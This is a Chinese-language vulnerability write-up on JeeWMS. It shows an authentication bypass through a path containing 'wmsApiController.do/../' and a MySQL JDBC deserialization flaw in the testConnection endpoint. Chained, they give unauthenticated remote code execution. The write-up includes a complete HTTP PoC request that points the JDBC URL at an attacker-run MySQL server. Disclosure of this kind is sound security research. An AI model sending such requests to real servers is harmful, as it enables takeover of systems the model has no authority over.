一、未授权访问：

身份校验类为 `org.jeecgframework.core.interceptors.AuthInterceptor`

之前可以使用`/rest/../`进行身份绕过，最新代码已经进行了修复，但是依然可以绕过实现未授权访问后台路由

漏洞代码位于`org.jeecgframework.core.interceptors.AuthInterceptor#preHandle`方法中错误的使用了`moHuConain`方法

![image-20250723155848602](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250723155848602.png?imageSlim)

`excludeContainUrls`包含的`url`如下图所示

![image-20250723155858276](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250723155858276.png?imageSlim)

由于`moHuContain`方法的验证逻辑是，只要`url`中包含`wmsApiController.do`或者`systemController/showOrDownByurl.do`，就可以直接通过身份校验。

漏洞复现如下所示：

(1) 包含`wmsApiController.do`之前，直接访问后台路由或者使用`/rest/../`进行绕过是无效的

![image-20250723155909416](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250723155909416.png?imageSlim)

![image-20250723155918521](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250723155918521.png?imageSlim)

(2) 包含`wmsApiController.do`之后，可以未授权访问后台路由，使用`/wmsApiController.do/../`进行绕过

![image-20250723155927883](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250723155927883.png?imageSlim)

二、远程代码执行

`org.jeecgframework.web.system.controller.core.DynamicDataSourceController#testConnection` 存在 `Mysql JDBC`反序列化导致任意代码执行

漏洞`POC`如下所示

```
GET /jeewms/wmsApiController.do/../dynamicDataSourceController.do?testConnection&driverClass=com.mysql.jdbc.Driver&url=jdbc:mysql://192.168.70.184:53101/test?autoDeserialize=true%26statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%26user=deser_CUSTOM HTTP/1.1
Host: 192.168.21.128:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
```

![image-20250723155944506](https://img-1325537595.cos.ap-beijing.myqcloud.com/image-20250723155944506.png?imageSlim)

二者结合可以打出前台无条件`RCE`的效果，实现任意代码执行，攻击者可以获取目标服务器权限。